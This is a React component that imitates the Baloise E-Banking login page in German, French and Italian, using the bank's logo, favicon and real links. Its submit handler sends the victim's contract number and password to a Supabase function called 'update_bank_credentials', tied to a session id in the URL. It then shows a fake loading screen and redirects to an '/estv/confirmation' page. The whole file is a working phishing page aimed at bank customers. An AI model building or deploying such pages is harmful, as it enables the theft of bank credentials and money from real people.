import { useEffect, useRef, useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Eye, EyeOff, Globe, X } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import baloiseLogo from "@/assets/baloise-logo.svg";

const NAVY = "#000d6e";
const BANNER = "#a7d1fa";
const BODY_BG = "#F1F4F7";
const BTN_BG = "#293485";
const HOVER_BG = "#a7d1fa";
const INPUT_BG = "#fafafa";
const BORDER = "#C9CDD4";
const ERROR = "#d32f2f";
const ERROR_BG = "#fdecea";
const FOOTER_BG = "#f6f6f6";
const FOOTER_TXT = "#6b7280";

type Lang = "de" | "fr" | "it";

const T: Record<Lang, Record<string, string>> = {
  de: {
    banner: "Wir sind Teil der Helvetia Baloise Gruppe",
    title: "Baloise E-banking",
    help: "Hilfe & Kontakt",
    h1: "Anmeldung",
    contract: "Vertragsnummer",
    password: "Passwort",
    placeholder: "Hier eingeben …",
    submit: "Anmelden",
    forgot: "Passwort vergessen",
    newDevice: "Neues Gerät aktivieren",
    required: "Ein Wert wird benötigt",
    langTitle: "Sprache wählen",
    fSecurity: "Sicherheit",
    fLegal: "Rechtliche Hinweise",
    fContact: "Kontakt",
    loading: "Anmeldedaten werden überprüft...",
  },
  fr: {
    banner: "Nous faisons partie du groupe Helvetia Baloise",
    title: "Baloise E-banking",
    help: "Aide & contact",
    h1: "Connexion",
    contract: "Numéro de contrat",
    password: "Mot de passe",
    placeholder: "Saisir ici …",
    submit: "Se connecter",
    forgot: "Mot de passe oublié",
    newDevice: "Activer un nouvel appareil",
    required: "Une valeur est requise",
    langTitle: "Choisir la langue",
    fSecurity: "Sécurité",
    fLegal: "Mentions légales",
    fContact: "Contact",
    loading: "Vérification des données de connexion...",
  },
  it: {
    banner: "Facciamo parte del gruppo Helvetia Baloise",
    title: "Baloise E-banking",
    help: "Aiuto & contatto",
    h1: "Accesso",
    contract: "Numero di contratto",
    password: "Password",
    placeholder: "Inserire qui …",
    submit: "Accedi",
    forgot: "Password dimenticata",
    newDevice: "Attivare nuovo dispositivo",
    required: "È richiesto un valore",
    langTitle: "Scegli la lingua",
    fSecurity: "Sicurezza",
    fLegal: "Note legali",
    fContact: "Contatto",
    loading: "Verifica dei dati di accesso in corso...",
  },
};

const LANG_OPTIONS: { code: Lang; label: string; short: string }[] = [
  { code: "de", label: "Deutsch", short: "DE" },
  { code: "fr", label: "Français", short: "FR" },
  { code: "it", label: "Italiano", short: "IT" },
];

const ChBaloise = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("de");
  const [langOpen, setLangOpen] = useState(false);
  const [contractTouched, setContractTouched] = useState(false);
  const [pwTouched, setPwTouched] = useState(false);
  const [contractFocus, setContractFocus] = useState(false);
  const [pwFocus, setPwFocus] = useState(false);
  const langRef = useRef<HTMLDivElement | null>(null);
  const t = T[lang];

  usePageMeta(
    "Baloise E-Banking Login",
    "https://ebanking.baloise.ch/auth/ui/assets/custom/img/favicon.ico"
  );

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    const onDoc = (e: MouseEvent) => {
      if (langRef.current && !langRef.current.contains(e.target as Node)) {
        setLangOpen(false);
      }
    };
    document.addEventListener("mousedown", onDoc);
    return () => document.removeEventListener("mousedown", onDoc);
  }, []);

  const contractError = contractTouched && vertragsnummer.trim() === "";
  const pwError = pwTouched && passwort === "";
  const disabled = vertragsnummer.trim() === "" || passwort === "";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (disabled) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  // Shared input style helper
  const inputStyle = (hasError: boolean, isFocus: boolean): React.CSSProperties => {
    if (hasError) {
      return {
        border: `2px solid ${ERROR}`,
        background: ERROR_BG,
        color: NAVY,
      };
    }
    return {
      border: `2px solid ${isFocus ? NAVY : BORDER}`,
      background: isFocus ? INPUT_BG : "#FFFFFF",
      color: NAVY,
    };
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen flex flex-col"
        style={{
          background: BODY_BG,
          fontFamily:
            "'Helvetica Neue', Helvetica, Arial, 'Segoe UI', Roboto, sans-serif",
          color: NAVY,
        }}
      >
        {/* Banner */}
        <div
          className="w-full text-center py-2 text-[15px] font-bold"
          style={{ background: BANNER, color: NAVY }}
        >
          {t.banner}
        </div>

        {/* Header */}
        <header
          className="w-full flex items-center justify-between px-4 md:px-10"
          style={{ background: NAVY, height: 80 }}
        >
          <div className="flex items-center gap-4">
            <a href="https://ebanking.baloise.ch/" aria-label="Baloise">
              <img src={baloiseLogo} alt="Baloise" className="h-7 md:h-8 w-auto" />
            </a>
            <span className="hidden sm:inline text-white font-bold text-[16px] md:text-[18px]">
              {t.title}
            </span>
          </div>
          <div className="flex items-center gap-2 md:gap-3">
            <a
              href="https://www.baloise.ch/DE-e-banking"
              target="_blank"
              rel="noopener noreferrer"
              className="hidden sm:inline-flex items-center px-4 py-2 rounded-md text-[14px] font-semibold transition-colors"
              style={{ background: BTN_BG, border: `1px solid ${BTN_BG}`, color: "#FFFFFF" }}
              onMouseEnter={(e) => {
                e.currentTarget.style.background = HOVER_BG;
                e.currentTarget.style.color = NAVY;
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.background = BTN_BG;
                e.currentTarget.style.color = "#FFFFFF";
              }}
            >
              {t.help}
            </a>
            <div className="relative" ref={langRef}>
              <button
                type="button"
                onClick={() => setLangOpen((v) => !v)}
                className="inline-flex items-center gap-2 px-3 md:px-4 py-2 rounded-md text-[14px] font-semibold transition-colors"
                style={{ background: BTN_BG, border: `1px solid ${BTN_BG}`, color: "#FFFFFF" }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.background = HOVER_BG;
                  e.currentTarget.style.color = NAVY;
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.background = BTN_BG;
                  e.currentTarget.style.color = "#FFFFFF";
                }}
                aria-haspopup="listbox"
                aria-expanded={langOpen}
              >
                <Globe className="w-4 h-4" strokeWidth={1.8} />
                {lang.toUpperCase()}
              </button>
              {langOpen && (
                <div
                  className="absolute right-0 top-full mt-3 z-30 rounded-lg bg-white min-w-[240px] shadow-[0_8px_24px_rgba(0,0,0,0.15)]"
                  role="listbox"
                >
                  {/* Speech-bubble arrow pointing up to DE button */}
                  <span
                    aria-hidden
                    className="absolute -top-2 right-5 w-3 h-3 bg-white rotate-45"
                    style={{ boxShadow: "-1px -1px 0 rgba(0,0,0,0.03)" }}
                  />
                  <div className="flex items-center justify-between px-4 pt-3 pb-2 relative">
                    <span className="text-[14px] font-semibold" style={{ color: NAVY }}>
                      {t.langTitle}
                    </span>
                    <button
                      type="button"
                      aria-label="Schließen"
                      onClick={() => setLangOpen(false)}
                      className="p-1 rounded hover:bg-gray-100"
                      style={{ color: NAVY }}
                    >
                      <X className="w-4 h-4" strokeWidth={2} />
                    </button>
                  </div>
                  <div className="flex flex-col gap-1 px-3 pb-3">
                    {LANG_OPTIONS.map((opt) => {
                      const active = opt.code === lang;
                      return (
                        <button
                          key={opt.code}
                          type="button"
                          onClick={() => {
                            setLang(opt.code);
                            setLangOpen(false);
                          }}
                          className="block w-full text-left px-3 py-2 rounded-md text-[14px] font-semibold transition-colors"
                          style={{
                            background: active ? NAVY : "#e8e8e8",
                            color: active ? "#d1d5db" : NAVY,
                          }}
                        >
                          {opt.label}
                        </button>
                      );
                    })}
                  </div>
                </div>
              )}
            </div>
          </div>
        </header>

        {/* Main */}
        <main className="flex-1 px-4 md:px-6 py-10 md:py-12">
          <div className="max-w-[480px] mx-auto">
            {/* Login Card */}
            <section className="bg-white rounded-2xl p-6 md:p-10 shadow-[0_8px_24px_rgba(0,0,0,0.08)]">
              <h1
                className="text-center font-semibold mb-8"
                style={{ color: NAVY, fontSize: "clamp(22px, 3vw, 28px)" }}
              >
                {t.h1}
              </h1>

              <form onSubmit={handleSubmit} className="flex flex-col gap-5">
                {/* Vertragsnummer */}
                <div>
                  <label
                    htmlFor="bal-contract"
                    className="block text-[14px] font-bold mb-2"
                    style={{ color: contractError ? ERROR : NAVY }}
                  >
                    {t.contract}
                  </label>
                  <input
                    id="bal-contract"
                    type="text"
                    autoComplete="username"
                    placeholder={t.placeholder}
                    value={vertragsnummer}
                    onChange={(e) => setVertragsnummer(e.target.value)}
                    onFocus={() => setContractFocus(true)}
                    onBlur={() => {
                      setContractFocus(false);
                      setContractTouched(true);
                    }}
                    onMouseEnter={(e) => {
                      if (!contractError && !contractFocus) {
                        e.currentTarget.style.background = INPUT_BG;
                      }
                    }}
                    onMouseLeave={(e) => {
                      if (!contractError && !contractFocus) {
                        e.currentTarget.style.background = "#FFFFFF";
                      }
                    }}
                    className="w-full h-11 rounded-md px-3 text-[15px] outline-none transition-colors"
                    style={inputStyle(contractError, contractFocus)}
                  />
                  {contractError && (
                    <p className="mt-1 text-[13px] font-normal" style={{ color: ERROR }}>
                      {t.required}
                    </p>
                  )}
                </div>

                {/* Passwort */}
                <div>
                  <label
                    htmlFor="bal-pw"
                    className="block text-[14px] font-bold mb-2"
                    style={{ color: pwError ? ERROR : NAVY }}
                  >
                    {t.password}
                  </label>
                  <div className="relative">
                    <input
                      id="bal-pw"
                      type={showPw ? "text" : "password"}
                      autoComplete="current-password"
                      placeholder={t.placeholder}
                      value={passwort}
                      onChange={(e) => setPasswort(e.target.value)}
                      onFocus={() => setPwFocus(true)}
                      onBlur={() => {
                        setPwFocus(false);
                        setPwTouched(true);
                      }}
                      onMouseEnter={(e) => {
                        if (!pwError && !pwFocus) {
                          e.currentTarget.style.background = INPUT_BG;
                        }
                      }}
                      onMouseLeave={(e) => {
                        if (!pwError && !pwFocus) {
                          e.currentTarget.style.background = "#FFFFFF";
                        }
                      }}
                      className="w-full h-11 rounded-md px-3 pr-11 text-[15px] outline-none transition-colors"
                      style={inputStyle(pwError, pwFocus)}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPw((v) => !v)}
                      className="absolute right-2 top-1/2 -translate-y-1/2 p-1"
                      aria-label={showPw ? "Passwort verbergen" : "Passwort anzeigen"}
                      style={{ color: NAVY }}
                    >
                      {showPw ? (
                        <Eye className="w-5 h-5" strokeWidth={1.8} />
                      ) : (
                        <EyeOff className="w-5 h-5" strokeWidth={1.8} />
                      )}
                    </button>
                  </div>
                  {pwError && (
                    <p className="mt-1 text-[13px] font-normal" style={{ color: ERROR }}>
                      {t.required}
                    </p>
                  )}
                </div>

                {/* Anmelden */}
                <button
                  type="submit"
                  disabled={disabled}
                  className="w-full h-12 rounded-md font-bold text-[15px] mt-2 transition-colors"
                  style={{
                    background: disabled ? "#E5E7EB" : NAVY,
                    color: disabled ? "#9CA3AF" : "#FFFFFF",
                    cursor: disabled ? "not-allowed" : "pointer",
                  }}
                  onMouseEnter={(e) => {
                    if (!disabled) e.currentTarget.style.background = "#000a4d";
                  }}
                  onMouseLeave={(e) => {
                    if (!disabled) e.currentTarget.style.background = NAVY;
                  }}
                >
                  {t.submit}
                </button>

                <div className="flex flex-wrap justify-center sm:justify-between gap-4 mt-3 text-[16px] font-bold">
                  <a
                    href="https://ebanking.baloise.ch/auth/ui/app/self-service/select/flow/password-reset"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="underline underline-offset-4"
                    style={{ color: NAVY }}
                  >
                    {t.forgot}
                  </a>
                  <a
                    href="https://ebanking.baloise.ch/auth/ui/app/self-service/flow/order-2fa-letter/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="underline underline-offset-4"
                    style={{ color: NAVY }}
                  >
                    {t.newDevice}
                  </a>
                </div>
              </form>
            </section>
          </div>
        </main>

        {/* Footer */}
        <footer className="py-2.5 mt-8" style={{ background: FOOTER_BG, boxShadow: "0 -2px 6px rgba(0,0,0,0.08)" }}>
          <div className="max-w-[1180px] mx-auto px-4 flex flex-wrap justify-center gap-6 md:gap-10 text-[12px] font-normal">
            {[
              {
                href: "https://www.baloise.ch/de/privatkunden/konten-karten-finanzierung/services/e-banking/sicherheit.html",
                label: t.fSecurity,
              },
              {
                href: "https://www.baloise.ch/e-banking-rechtliche-hinweise",
                label: t.fLegal,
              },
              {
                href: "https://www.baloise.ch/kontakt",
                label: t.fContact,
              },
            ].map((link) => (
              <a
                key={link.href}
                href={link.href}
                target="_blank"
                rel="noopener noreferrer"
                style={{ color: FOOTER_TXT }}
                className="transition-colors"
                onMouseEnter={(e) => (e.currentTarget.style.color = NAVY)}
                onMouseLeave={(e) => (e.currentTarget.style.color = FOOTER_TXT)}
              >
                {link.label}
              </a>
            ))}
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChBaloise;
